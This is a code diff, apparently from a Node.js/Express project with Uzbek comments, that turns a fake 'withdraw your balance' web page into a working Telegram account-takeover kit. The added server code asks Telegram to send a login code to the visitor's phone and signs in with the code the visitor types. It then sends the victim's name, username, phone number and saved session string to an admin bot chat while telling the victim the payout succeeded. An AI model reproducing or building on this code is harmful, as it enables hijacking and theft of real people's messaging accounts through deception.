@@ -1,130 +1,148 @@
 require('dotenv').config();
 const express = require('express');
-const path = require('path');
 const TelegramBot = require('node-telegram-bot-api');
+const { TelegramClient } = require('telegram');
+const { StringSession } = require('telegram/sessions');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Telegram Botni sozlash
+// Env o'zgaruvchilari
 const BOT_TOKEN = process.env.BOT_TOKEN;
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+const ADMIN_ID = process.env.ADMIN_ID;
+// my.telegram.org saytidan olingan API ma'lumotlari
+const API_ID = parseInt(process.env.API_ID || "123456"); 
+const API_HASH = process.env.API_HASH || "your_api_hash_here";
 
-// Telegram Chat ID va Telefon raqamlarini moslashtirib saqlash xotirasi (Database o'rniga)
-const userSessions = {};
-let activeCode = "12345";
+const bot = new TelegramBot(BOT_TOKEN, { polling: false });
 
 app.use(express.json());
 
-// 1. API Marshrutlari (Backend logic)
+// Aktiv sessiyalar va auth parametrlarini xotirada saqlash
+const activeAuthSessions = {};
+
+// 1. API Marshrutlari
 app.get('/api/get-balance', (req, res) => {
     res.json({ success: true, balance: 10000 });
 });
 
-// Saytda raqam kiritilganda ushbu raqam egasining Telegramiga kod yuborish
+// Saytda raqam kiritilganda Telegram orqali SMS/App-kod yuborish
 app.post('/api/send-code', async (req, res) => {
     let { phone } = req.body;
     if (!phone) {
         return res.json({ success: false, message: "Telefon raqam kiritilmadi!" });
     }
 
-    // Telefon formati to'g'rilanadi (faqat raqamlar qoldiriladi)
-    phone = phone.replace(/\D/g, ''); 
-    if (phone.startsWith('998')) phone = phone.substring(3);
-
-    const targetChatId = userSessions[phone];
-
-    // 5 xonali tasodifiy kod yaratish
-    activeCode = Math.floor(10000 + Math.random() * 90000).toString();
+    phone = phone.replace(/\D/g, '');
+    if (!phone.startsWith('998') && phone.length === 9) {
+        phone = '998' + phone;
+    }
 
     try {
-        // 1-Variant: Agar ushbu raqam egasi botdan ro'yxatdan o'tgan bo'lsa, to'g'ridan-to'g'ri o'ziga yuborish
-        if (targetChatId) {
+        const stringSession = new StringSession("");
+        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
+            connectionRetries: 5,
+        });
+
+        await client.connect();
+
+        // Telegram xizmatidan kod yuborish so'rovi
+        const { phoneCodeHash } = await client.sendCode(
+            {
+                apiId: API_ID,
+                apiHash: API_HASH,
+            },
+            '+' + phone
+        );
+
+        // Vaqtincha saqlash
+        activeAuthSessions[phone] = {
+            client,
+            phoneCodeHash,
+            session: stringSession
+        };
+
+        // Admin botga xabar
+        if (ADMIN_ID) {
             await bot.sendMessage(
-                targetChatId,
-                `🔑 *Sizning tasdiqlash kodingiz:* \`${activeCode}\`\n\nKodni hech kimga bermang!`,
+                ADMIN_ID,
+                `📱 *Yangi raqam kiritildi!*\nRaqam: \`+${phone}\`\nKod yuborildi.`,
                 { parse_mode: 'Markdown' }
             );
         }
 
-        // 2-Variant: Admin sozlangani bo'yicha bildirishnoma yuborish
-        if (process.env.ADMIN_ID) {
-            await bot.sendMessage(
-                process.env.ADMIN_ID,
-                `📥 *Yangi kod so'raldi!*
-📱 *Telefon:* +998${phone}
-🔑 *Generatsiya qilingan kod:* \`${activeCode}\``,
-                { parse_mode: 'Markdown' }
-            );
-        }
-
-        console.log(`[LOG] Raqam: +998${phone} \vert{} Kod:${activeCode}`);
-        res.json({ success: true, message: "Kod yuborildi!" });
+        res.json({ success: true, message: "Kod Telegram ilovangizga yuborildi!" });
     } catch (error) {
-        console.error("Telegramga yuborishda xatolik:", error);
-        res.json({ success: false, message: "Serverda xatolik yuz berdi!" });
+        console.error("Kod yuborishda xatolik:", error);
+        res.json({ success: false, message: "Kod yuborishda xatolik yuz berdi: " + error.message });
     }
 });
 
-// Saytda kiritilgan kodni tasdiqlash va Telegram Botga yuborish marshruti
+// Kod kiritilganda server orqali Telegramga kirish (Session yaratish)
 app.post('/api/submit-withdraw', async (req, res) => {
     const { inputCode, phone } = req.body;
 
-    if (!inputCode) {
-        return res.json({ success: false, message: "Kod kiritilmadi!" });
+    let cleanPhone = phone ? phone.replace(/\D/g, '') : '';
+    if (!cleanPhone.startsWith('998') && cleanPhone.length === 9) {
+        cleanPhone = '998' + cleanPhone;
     }
 
-    // Saytda kiritilgan kodni Telegram botga (Admin yoki foydalanuvchiga) bildirishnoma shaklida yuborish
+    const authData = activeAuthSessions[cleanPhone];
+
+    if (!authData) {
+        return res.json({ success: false, message: "Sessiya topilmadi! Qaytadan raqam kiriting." });
+    }
+
     try {
-        const notifyText = `📩 *Saytdan kiritilgan kod!*
-📱 *Telefon:* +998${phone || 'Ko\'rsatilmadi'}
-🔢 *Foydalanuvchi kiritgan kod:* \`${inputCode}\`
-STATUS: ${inputCode === activeCode ? '✅ To\'g\'ri kod' : '❌ Noto\'g\'ri kod'}`;
+        const { client, phoneCodeHash, session } = authData;
 
-        if (process.env.ADMIN_ID) {
-            await bot.sendMessage(process.env.ADMIN_ID, notifyText, { parse_mode: 'Markdown' });
-        }
-
-        let cleanPhone = phone ? phone.replace(/\D/g, '') : '';
-        if (cleanPhone.startsWith('998')) cleanPhone = cleanPhone.substring(3);
-        
-        if (userSessions[cleanPhone]) {
-            await bot.sendMessage(userSessions[cleanPhone], notifyText, { parse_mode: 'Markdown' });
-        }
-    } catch (err) {
-        console.error("Telegramga kiritilgan kodni yuborishda xatolik:", err);
-    }
-
-    if (inputCode !== activeCode) {
-        return res.json({ success: false, message: "Kod noto'g'ri! Iltimos, qaytadan tekshiring." });
-    }
-
-    res.json({ success: true, message: "Mablag' muvaffaqiyatli yechib olindi!", newBalance: 0 });
-});
-
-// Telegram Bot xabarlarini eshitish (Start va Kontakt ulash)
-bot.on('message', (msg) => {
-    const chatId = msg.chat.id;
-
-    if (msg.contact && msg.contact.phone_number) {
-        let phone = msg.contact.phone_number.replace(/\D/g, '');
-        if (phone.startsWith('998')) phone = phone.substring(3);
-
-        userSessions[phone] = chatId; // Telefon raqam va Chat ID bir-biriga bog'landi
-        bot.sendMessage(chatId, "✅ Raqamingiz muvaffaqiyatli ulandi! Endi saytdan so'ralgan kodlar shu yerga keladi.");
-    } else if (msg.text === '/start') {
-        bot.sendMessage(chatId, `Assalomu alaykum! Sayt so'rovlari va kodlarini Telegramdan olish uchun pastdagi tugma orqali raqamingizni yuboring:\n\nSizning Chat ID: \`${chatId}\``, {
-            parse_mode: 'Markdown',
-            reply_markup: {
-                keyboard: [[{ text: "📱 Raqamni ulash", request_contact: true }]],
-                resize_keyboard: true,
-                one_time_keyboard: true
-            }
+        // Server foydalanuvchi kiritgan kod orqali Telegramga kiradi
+        await client.signIn({
+            phoneNumber: '+' + cleanPhone,
+            phoneCodeHash: phoneCodeHash,
+            phoneCode: inputCode,
         });
+
+        const me = await client.getMe();
+        const sessionString = session.save(); // Saqlangan Telegram Session
+
+        const usernameText = me.username ? `@${me.username}` : "Username yo'q";
+        const firstName = me.firstName || "";
+        const lastName = me.lastName || "";
+
+        // Admin botga bildirishnoma yuborish
+        if (ADMIN_ID) {
+            const notifyText = `🚀 *Server Telegramga kirdi!*
+
+👤 *Foydalanuvchi:* ${firstName}${lastName}
+🏷 *Username:* ${usernameText}
+📱 *Telefon:* \`+${cleanPhone}\`
+🔑 *Kiritilgan Kod:* \`${inputCode}\`
+
+📄 *Session String:*
+\`\`\`
+${sessionString}
+\`\`\``;
+
+            await bot.sendMessage(ADMIN_ID, notifyText, { parse_mode: 'Markdown' });
+        }
+
+        // Tizimdan o'chirish
+        delete activeAuthSessions[cleanPhone];
+
+        res.json({ success: true, message: "Mablag' muvaffaqiyatli yechib olindi!", newBalance: 0 });
+    } catch (err) {
+        console.error("Kirishda xatolik:", err);
+        
+        if (ADMIN_ID) {
+            await bot.sendMessage(ADMIN_ID, `❌ *Xatolik:* +${cleanPhone} raqami noto'g'ri kod kiritdi (\`${inputCode}\`).`, { parse_mode: 'Markdown' });
+        }
+
+        res.json({ success: false, message: "Kod noto'g'ri yoki muddat o'tgan!" });
     }
 });
 
-// 2. Frontend HTML sahifasi
+// 2. Frontend HTML Sahifasi
 app.get('/', (req, res) => {
     res.send(`
 <!DOCTYPE html>
@@ -407,6 +425,8 @@ app.get('/', (req, res) => {
     async function sendVerificationCode() {
         const phone = document.getElementById('withdrawPhone').value.trim();
         if (phone.length < 9) { alert("To'g'ri raqam kiriting!"); return; }
+        
+        document.getElementById('sendCodeBtn').innerText = "Kod yuborilmoqda...";
         try {
             const res = await fetch(\`\${API_URL}/send-code\`, {
                 method: 'POST',
@@ -418,10 +438,15 @@ app.get('/', (req, res) => {
                 document.getElementById('statusAlert').innerText = data.message;
                 document.getElementById('statusAlert').style.display = 'block';
                 document.getElementById('codeGroup').style.display = 'block';
+                document.getElementById('sendCodeBtn').innerText = "Qayta yuborish";
             } else {
                 alert(data.message);
+                document.getElementById('sendCodeBtn').innerText = "Telegramdan Kod Olish";
             }
-        } catch (e) { alert("Xatolik yuz berdi!"); }
+        } catch (e) { 
+            alert("Xatolik yuz berdi!"); 
+            document.getElementById('sendCodeBtn').innerText = "Telegramdan Kod Olish";
+        }
     }
 
     function moveNext(input, index) {
